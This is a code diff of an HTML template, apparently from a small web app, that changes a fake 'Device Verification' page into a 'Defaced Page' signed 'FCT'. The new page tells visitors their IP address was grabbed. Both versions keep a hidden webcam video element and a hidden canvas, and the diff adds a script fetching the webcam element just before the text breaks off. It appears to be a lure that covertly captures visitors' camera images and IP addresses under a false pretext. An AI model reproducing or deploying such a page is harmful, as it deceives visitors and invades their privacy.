@@ -13,49 +13,89 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Verification</title>
+    <title>Defaced Page</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
+            background: black;
+            color: white;
+            font-family: monospace;
             text-align: center;
-            padding: 50px;
-            background: linear-gradient(to bottom, #ff6e7f, #bfe9ff);
-            color: #222;
+            background-image: url('https://i.ibb.co/dsSdQV7s/536c6323d439596e766f055498e775e4.jpg');
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
         }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.3);
+        .logo-container {
+            margin-top: 50px;
+            width: 250px;
+            height: 250px;
+            border-radius: 50%;
+            overflow: hidden;
+            box-shadow: 0 0 20px 5px rgba(255, 255, 255, 0.8);
+            transition: transform 0.3s ease;
+        }
+        .logo-container:hover {
+            transform: scale(1.05);
+        }
+        .logo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         h1 {
-            color: #2c3e50;
-            font-size: 28px;
+            font-size: 40px;
+            color: red;
+            text-shadow: 0 0 15px red;
+            margin: 20px 0;
+        }
+        .warning {
+            color: yellow;
+            font-size: 22px;
+            margin: 10px 0;
         }
         p {
-            font-size: 18px;
-            margin-bottom: 20px;
+            margin: 10px 0;
+        }
+        .time {
+            margin-top: 30px;
+            font-size: 20px;
+            color: #f55;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        video {
+            display: none;
         }
         #status {
             font-size: 16px;
             color: #c0392b;
         }
-        video {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Device Verification</h1>
-        <p>Please allow access to verify your device.</p>
-        <video id="webcam" autoplay playsinline></video>
-        <p id="status">Checking device...</p>
-    </div>
-
+    <a href="https://i.ibb.co/VpMYjFrn/30b94658f685ffd183c8c442d2973d30.jpg" target="_blank">
+        <div class="logo-container">
+            <img src="https://i.ibb.co/VpMYjFrn/30b94658f685ffd183c8c442d2973d30.jpg" alt="Logo" class="logo">
+        </div>
+    </a>
+    <h1>FCT</h1>
+    <p class="warning">WARNING</p>
+    <p>Your IP address was grabbed by FCT.<br>Please strengthen your security next time.</p>
+    <p>FCT WAS HERE</p>
+    <p>[FCT]</p>
+    <p id="status">Checking device...</p>
+    <video id="webcam" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
+
+    <div class="time"></div>
+    <div class="footer"><br></div>
 
     <script>
         const webcamElement = document.getElementById('webcam');
